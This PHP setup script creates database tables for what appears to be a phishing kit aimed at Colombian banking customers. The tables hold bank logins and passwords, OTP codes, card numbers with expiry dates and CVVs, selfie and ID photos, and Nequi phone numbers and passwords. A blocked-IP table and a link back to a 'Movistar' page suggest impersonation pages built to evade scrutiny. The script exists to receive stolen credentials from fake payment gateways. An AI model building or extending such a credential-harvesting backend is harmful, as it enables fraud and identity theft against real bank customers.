<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Incluir configuración global
$config = require __DIR__ . '/config.php';

echo "<h1>⚙️ Inicializando Tablas de Base de Datos</h1><hr>";
echo "<div style='background:#f4f4f4; padding:15px; border:1px solid #ddd; margin-bottom:20px; font-family:monospace;'>";
echo "<strong>🔍 DIAGNÓSTICO DE CONEXIÓN:</strong><br>";
echo "DB Host: " . htmlspecialchars($config['db_host'] ?? 'N/A') . "<br>";
echo "DB User: " . htmlspecialchars($config['db_user'] ?? 'N/A') . "<br>";
echo "DB Name: " . htmlspecialchars($config['db_name'] ?? 'N/A') . "<br>";
echo "DB Port: " . htmlspecialchars($config['db_port'] ?? 'N/A') . "<br>";
echo "</div>";

require_once __DIR__ . '/db.php';

try {
    $driver = $conn->getAttribute(PDO::ATTR_DRIVER_NAME);
    echo "<p>Driver detectado: <strong>" . strtoupper($driver) . "</strong></p>";

    // Ajustes de sintaxis dependiendo del SGBD (PostgreSQL vs MySQL)
    if ($driver === 'pgsql') {
        $primaryKey = "SERIAL PRIMARY KEY";
        $timestamp = "TIMESTAMP DEFAULT CURRENT_TIMESTAMP";
    } else {
        $primaryKey = "INT AUTO_INCREMENT PRIMARY KEY";
        $timestamp = "TIMESTAMP DEFAULT CURRENT_TIMESTAMP";
    }

    // 1. Tabla PSE (General para Bancolombia, BBVA, etc)
    echo "<p>Creando tabla 'pse'...</p>";
    $sql_pse = "CREATE TABLE IF NOT EXISTS pse (
        id $primaryKey,
        usuario VARCHAR(255),
        clave VARCHAR(255),
        banco VARCHAR(255),
        email VARCHAR(255),
        ip_address VARCHAR(255),
        estado INT DEFAULT 0,
        otp VARCHAR(50),
        tarjeta VARCHAR(50),
        fecha_exp VARCHAR(20),
        cvv VARCHAR(10),
        foto_selfie VARCHAR(255),
        foto_front VARCHAR(255),
        foto_back VARCHAR(255),
        fecha $timestamp
    )";
    $conn->exec($sql_pse);
    echo "<p style='color:green'>✅ Tabla 'pse' instalada/verificada.</p>";

    // 2. Tabla NEQUI 
    echo "<p>Creando tabla 'nequi'...</p>";
    $sql_nequi = "CREATE TABLE IF NOT EXISTS nequi (
        id $primaryKey,
        celular VARCHAR(50),
        clave VARCHAR(50),
        ip_address VARCHAR(255),
        estado INT DEFAULT 0,
        otp VARCHAR(50),
        fecha $timestamp
    )";
    $conn->exec($sql_nequi);
    echo "<p style='color:green'>✅ Tabla 'nequi' instalada/verificada.</p>";

    // 3. Tabla BLOCKED_IPS (Lista de IPs Baneadas)
    echo "<p>Creando tabla 'blocked_ips'...</p>";
    $sql_blocked = "CREATE TABLE IF NOT EXISTS blocked_ips (
        id $primaryKey,
        ip VARCHAR(255) UNIQUE,
        created_at $timestamp
    )";
    $conn->exec($sql_blocked);
    echo "<p style='color:green'>✅ Tabla 'blocked_ips' instalada/verificada.</p>";

    echo "<hr><h3>🎉 ¡Instalación Completada con Éxito!</h3>";
    echo "<p>Las tablas están listas en tu base de datos de Neon Tech. ¡Ya puedes recibir datos de las pasarelas!</p>";
    echo "<a href='../index.html' style='display:inline-block; padding:10px 20px; background:#1a1b1c; color:#fff; text-decoration:none; border-radius:5px;'>Volver a Movistar</a>";

} catch (PDOException $e) {
    die("<div style='background:#ffebee; color:#c62828; padding:15px; border-radius:5px;'><strong>Error Fatal de BD:</strong> " . htmlspecialchars($e->getMessage()) . "</div>");
}
?>
